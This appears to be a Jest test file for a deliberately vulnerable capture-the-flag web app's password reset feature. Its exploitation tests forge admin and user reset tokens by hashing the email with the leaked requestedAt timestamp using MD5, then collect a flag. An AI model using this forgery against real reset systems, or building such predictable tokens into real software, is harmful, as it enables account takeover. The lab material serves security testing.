import crypto from "crypto";
import { apiRequest, TEST_USERS, expectFlag } from "../helpers/api";
import { FLAGS } from "../helpers/flags";

function hashMD5(text: string): string {
  return crypto.createHash("md5").update(text).digest("hex");
}

describe("Insecure Password Reset", () => {
  const ADMIN_EMAIL = TEST_USERS.admin.email;

  describe("Forgot password endpoint", () => {
    it("returns 200 and requestedAt for a valid email", async () => {
      const { status, data } = await apiRequest<{
        message: string;
        requestedAt: string;
      }>("/api/auth/forgot-password", {
        method: "POST",
        body: JSON.stringify({ email: "alice@example.com" }),
      });

      expect(status).toBe(200);
      expect(data.message).toContain("reset link has been sent");
      expect(data.requestedAt).toBeDefined();
      expect(new Date(data.requestedAt).getTime()).not.toBeNaN();
    });

    it("returns 200 even for non-existent email (no enumeration)", async () => {
      const { status, data } = await apiRequest<{
        message: string;
        requestedAt: string;
      }>("/api/auth/forgot-password", {
        method: "POST",
        body: JSON.stringify({ email: "nonexistent@example.com" }),
      });

      expect(status).toBe(200);
      expect(data.message).toContain("reset link has been sent");
      expect(data.requestedAt).toBeDefined();
    });

    it("returns 400 when email is missing", async () => {
      const { status } = await apiRequest("/api/auth/forgot-password", {
        method: "POST",
        body: JSON.stringify({}),
      });

      expect(status).toBe(400);
    });
  });

  describe("Reset password endpoint", () => {
    it("returns 400 for invalid token", async () => {
      const { status, data } = await apiRequest<{ error: string }>(
        "/api/auth/reset-password",
        {
          method: "POST",
          body: JSON.stringify({
            token: "invalidtoken",
            password: "newpass123",
          }),
        }
      );

      expect(status).toBe(400);
      expect(data.error).toContain("Invalid or expired");
    });

    it("returns 400 when password is too short", async () => {
      const { status, data } = await apiRequest<{ error: string }>(
        "/api/auth/reset-password",
        {
          method: "POST",
          body: JSON.stringify({ token: "sometoken", password: "ab" }),
        }
      );

      expect(status).toBe(400);
      expect(data.error).toContain("at least 6 characters");
    });
  });

  describe("Exploitation: predictable token forgery for admin", () => {
    it("forges a valid reset token using requestedAt timestamp and retrieves the flag", async () => {
      const { status: forgotStatus, data: forgotData } = await apiRequest<{
        message: string;
        requestedAt: string;
      }>("/api/auth/forgot-password", {
        method: "POST",
        body: JSON.stringify({ email: ADMIN_EMAIL }),
      });

      expect(forgotStatus).toBe(200);
      expect(forgotData.requestedAt).toBeDefined();

      const timestamp = Math.floor(
        new Date(forgotData.requestedAt).getTime() / 1000
      );
      const forgedToken = hashMD5(ADMIN_EMAIL + timestamp);

      const { status: resetStatus, data: resetData } = await apiRequest<{
        message: string;
        flag?: string;
      }>("/api/auth/reset-password", {
        method: "POST",
        body: JSON.stringify({ token: forgedToken, password: "hacked123" }),
      });

      expect(resetStatus).toBe(200);
      expect(resetData.message).toContain("reset successfully");
      expectFlag(resetData, FLAGS.INSECURE_PASSWORD_RESET);
    });
  });

  describe("Exploitation: predictable token forgery for regular user", () => {
    it("returns the flag when resetting a regular user password", async () => {
      const { data: forgotData } = await apiRequest<{
        message: string;
        requestedAt: string;
      }>("/api/auth/forgot-password", {
        method: "POST",
        body: JSON.stringify({ email: "alice@example.com" }),
      });

      const timestamp = Math.floor(
        new Date(forgotData.requestedAt).getTime() / 1000
      );
      const forgedToken = hashMD5("alice@example.com" + timestamp);

      const { status, data } = await apiRequest<{
        message: string;
        flag?: string;
      }>("/api/auth/reset-password", {
        method: "POST",
        body: JSON.stringify({ token: forgedToken, password: "newpass123" }),
      });

      expect(status).toBe(200);
      expectFlag(data, FLAGS.INSECURE_PASSWORD_RESET);
    });
  });

  describe("Token cannot be reused", () => {
    it("returns 400 when trying to use an already-used token", async () => {
      const { data: forgotData } = await apiRequest<{
        requestedAt: string;
      }>("/api/auth/forgot-password", {
        method: "POST",
        body: JSON.stringify({ email: "bob@example.com" }),
      });

      const timestamp = Math.floor(
        new Date(forgotData.requestedAt).getTime() / 1000
      );
      const token = hashMD5("bob@example.com" + timestamp);

      await apiRequest("/api/auth/reset-password", {
        method: "POST",
        body: JSON.stringify({ token, password: "newpass123" }),
      });

      const { status, data } = await apiRequest<{ error: string }>(
        "/api/auth/reset-password",
        {
          method: "POST",
          body: JSON.stringify({ token, password: "anotherpass" }),
        }
      );

      expect(status).toBe(400);
      expect(data.error).toContain("already been used");
    });
  });
});
